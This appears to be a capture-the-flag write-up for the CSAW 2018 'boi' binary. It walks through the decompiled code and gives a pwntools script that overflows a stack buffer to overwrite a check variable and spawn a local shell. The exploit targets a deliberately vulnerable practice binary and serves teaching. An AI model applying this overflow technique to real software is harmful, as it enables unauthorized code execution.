# csaw18_boi

[Link to
binary](https://github.com/guyinatuxedo/nightmare/raw/master/modules/04-bof_variable/csaw18_boi/boi)

---

```
~/Downloads > ./boi 
Are you a big boiiiii??
you bet
Sat Sep 18 08:51:12 PM CEST 2021
```

This challenge looks similar to the past ones: a prompt that asks for input. The
challenge description says this is solved by smashing the stack.

Let's take a look at main:

```
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 local_30;
  undefined4 uStack40;
  uint iStack36;
  undefined4 local_20;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 40);
  local_38 = 0;
  local_30 = 0;
  local_20 = 0;
  uStack40 = 0;
  iStack36 = 3735928559;
  puts("Are you a big boiiiii??");
  read(0,&local_38,24);
  if (iStack36 == 0xcaf3baee) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (canary != *(long *)(in_FS_OFFSET + 40)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Ok so if we can figure out how to make `iStack36` be equal to `0xcaf3baee` then we'll get access to a shell and the challenge is solved.

You can see that the binary reads 24 bytes and stores them in the stack starting from `local_38`. But that is only 8 bytes. So `local_30` takes up another 8 bytes. Then `uStack40` takes 4. And then we have our target variable `iStack36` taking up the remaining 4.

Can we craft a 24 bytes input which puts the last 4 bytes inside `iStack36`? Yes it's very straightforward. Here's a Python script that does that:

```python
from pwn import *

p = process("./boi")

p.sendline(20 * b" " + bytes.fromhex("caf3baee")[::-1])
p.interactive()
```

The `[::-1]` I added simply because it didn't work without it so I figured it
could be an endianness issue, and it was because reversing the bytes solved it.

```
~/Downloads > python pwn_boi.py 
[+] Starting local process './boi': pid 19183
[*] Switching to interactive mode
Are you a big boiiiii??
$ whoami
elia
```
